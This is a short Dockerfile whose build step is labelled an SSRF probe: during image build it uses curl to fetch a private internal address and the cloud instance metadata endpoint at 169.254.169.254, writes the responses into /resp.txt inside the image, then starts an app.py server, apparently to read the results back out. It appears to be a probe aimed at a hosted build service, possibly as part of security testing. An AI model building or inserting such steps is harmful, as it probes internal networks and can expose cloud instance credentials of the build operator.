FROM python:3.11-alpine
RUN apk add --no-cache curl
RUN echo "=== BUILD-ENV SSRF PROBE ===" > /resp.txt; \
    (curl -s -m 8 -i http://192.168.4.72:8000/ >> /resp.txt 2>&1 && echo "BUILD_FETCH_OK" >> /resp.txt) \
    || echo "BUILD_FETCH_FAILED rc=$?" >> /resp.txt; \
    echo "--- also try metadata ---" >> /resp.txt; \
    (curl -s -m 5 http://169.254.169.254/latest/meta-data/ >> /resp.txt 2>&1) || echo "META_FAILED" >> /resp.txt
COPY app.py /app.py
EXPOSE 8080
CMD ["python","/app.py"]
